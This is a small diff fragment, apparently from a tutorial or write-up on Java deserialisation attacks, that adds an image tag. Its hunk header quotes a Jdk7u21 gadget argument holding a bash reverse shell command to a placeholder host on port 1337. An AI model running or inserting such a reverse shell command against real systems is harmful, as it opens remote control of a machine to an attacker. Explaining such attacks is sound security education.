@@ -228,3 +228,6 @@ Jdk7u21 "/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/ipaddress/1337<&1"
   <img src="/images/deserialisation/descc24.png">
 </p>
 
+<p align="center">
+  <img src="/images/deserialisation/descc25.png">
+</p>
